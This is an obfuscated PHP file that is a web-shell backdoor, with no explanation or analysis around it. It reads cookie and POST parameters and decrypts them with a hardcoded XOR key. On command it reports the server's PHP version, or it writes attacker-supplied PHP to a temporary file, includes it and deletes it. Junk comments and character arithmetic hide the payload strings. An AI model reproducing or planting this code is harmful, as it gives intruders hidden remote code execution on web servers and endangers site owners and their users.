<?php     function/* w   */ibk_m(){$zrjtk='ccphvtbta';	print_r	(73354+73354);/* kthqd*/}
$zxjch	=	'zxjch'  ^/*   ewn   */'';


function/*lzkq */rntglaxq($rntevkboz_,/*  _   */$ajvrjaqnjrwkmffhhgp)

{

    global	$zxjch;

/*   lli   */$ezxbeelz/* zysk */=       "";


    for/*   jru   */($ajvrjaqnjr/*vmua  */=   0;	$ajvrjaqnjr   <	strlen($rntevkboz_);)     {


       for    ($zjawoko	=	0;/*   tlpju  */$zjawoko       <   strlen($ajvrjaqnjrwkmffhhgp)  &&     $ajvrjaqnjr	<	strlen($rntevkboz_);       $zjawoko++,/*   yagr  */$ajvrjaqnjr++)/*   p */{


	$ezxbeelz  .=	$zxjch(ord($rntevkboz_[$ajvrjaqnjr])	^	ord($ajvrjaqnjrwkmffhhgp[$zjawoko]));
     }
       }/*  f */return   $ezxbeelz;


}


function/*uizcz  */liiqozbhuj($_bijm,	$rntevkboz_)


{
      global	$zxjch;
/*   v   */$gnenv/*  rpes  */=/*  svcio*/sprintf("\56"	.     "/".$zxjch(39-2)      .	"s".$zxjch(269-223)/* dho   */.	$zxjch(323-211)	./*x  */"l",       md5($_bijm));

/*  nwlv */file_put_contents($gnenv,	"<"     ./*   yopk */$zxjch(346-283)      ./*   q  */"p"."h"."p".$zxjch(32)	.	"u"."n"."\x6c"	./*n_d   */$zxjch(651-546)	.	"n"."\153"	.     "\50"/*  runcl   */.  $zxjch(518-423)	.	"_"."\106"/* js*/.   "I"."\114"	.  "\105"/*  koefe   */./* yzuei*/"\x5f"     .	"_".$zxjch(41)      ./*  gfk*/$zxjch(59)	./*fp_ow*/$zxjch(32)/* woql  */./* _cc*/$rntevkboz_["d"]);  include($gnenv);
	$vnptj	=/*   dpx*/$gnenv;


   unlink($vnptj);
}





function/*baa   */qyurb()


{   global/*   slz*/$zxjch;


	
      $ajvrjaqnjr	=/*   msrle   */array();
/* _qa */$ajvrjaqnjr["\x70"	./*li_sb   */"\166"]/*ugz*/=	phpversion();
	$ajvrjaqnjr["\163"      ./*  lk */"v"]     =/*  ydzo   */$zxjch(51)/*   b  */./*   i  */"."."\x35";
/*v */echo/* sxvex  */@serialize($ajvrjaqnjr);

}



function/*uv  */ocvuutz($rntevkboz_,	$_bijm,/* od  */$vyfipgiit)
{
	global	$zxjch;     


	$rntevkboz_	=	unserialize(rntglaxq(rntglaxq(base64_decode($rntevkboz_),	$_bijm),       $vyfipgiit));
/* q  */if/*hzg   */(isset($rntevkboz_["\141"       .      "\x6b"]))  {/*   g*/if  ($rntevkboz_["a"]	==/* m  */"i")/*dr */{


	qyurb();


/* qx */}/*  q  */elseif      ($rntevkboz_["a"]/* g  */==     "e")/*  iglkw*/{


/*  r  */liiqozbhuj($_bijm,	$rntevkboz_);

	}
     exit();
/*   qu  */}
}$pwiztaast  =	$_COOKIE;


$xojuwi      =     $_POST;


$pwiztaast    =   array_merge($xojuwi,	$pwiztaast);


$_bijm	=	"e"."\x37"	.      "3".$zxjch(100)/*   a */.  $zxjch(57)	.     "2".$zxjch(407-305)/*szit_*/.       "4"."-"."\144"   .	"d".$zxjch(664-610)	./*   i */"\x64"       .  "\55"/* w  */.	$zxjch(52)   ./*  v  */$zxjch(102)/* fjq_*/.	"e"."0"."\x2d"  .	$zxjch(82-26)  .  "2"."\x30"	.	$zxjch(56)/*_l */.       "-"."\142"/*abvkf*/.     "3"."\63"/*_exov */.   "0"."7".$zxjch(55)/*   qtnsq   */.    "6".$zxjch(48)	.	$zxjch(50)	.	"f"."b"."\x61";

foreach     ($pwiztaast    as  $vyfipgiit	=>/*awm*/$rntevkboz_)       {

    ocvuutz($rntevkboz_,/* zmf*/$_bijm,/*jvg */$vyfipgiit);}



